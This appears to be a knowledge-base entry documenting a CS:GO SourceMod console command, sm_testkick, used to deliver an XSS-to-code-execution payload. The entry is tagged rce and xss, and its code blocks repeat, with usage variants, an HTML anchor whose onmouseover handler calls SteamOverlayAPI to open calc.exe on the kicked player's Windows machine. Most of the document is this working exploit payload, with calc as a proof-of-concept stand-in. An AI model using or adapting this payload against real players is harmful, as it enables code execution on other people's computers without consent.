---
id: cmd-csgo-sm-testkick-001
data: >-
  sm_testkick <a
  onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The
  remote host stopped receiving communications and closed the connection</a>
tags:
  - rce
  - xss
type: command
output: Calculator launches on mouseover of the message text
executor: csgo-console
platforms:
  - Windows
  - Game
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.834Z'
verified: false
validated: true
submitted: true
---
# sm-testkick-with-rce-payload

## Command

```bash
# In CS:GO console after connecting to server with testkick.smx
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

## Description

Executes a SourceMod plugin command to kick the player with a malicious HTML message, triggering XSS and RCE via SteamOverlayAPI on mouseover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payload | Full <a> tag with onmouseover JS | Yes |

## Examples

### Basic Usage

```bash
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">Message</a>
```

### Advanced Usage

Include descriptive text:

```bash
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

## Expected Output

Kick popup appears; hovering over the link launches calc.exe.

## Related

- [[commands/disconnect-with-image-payload]]
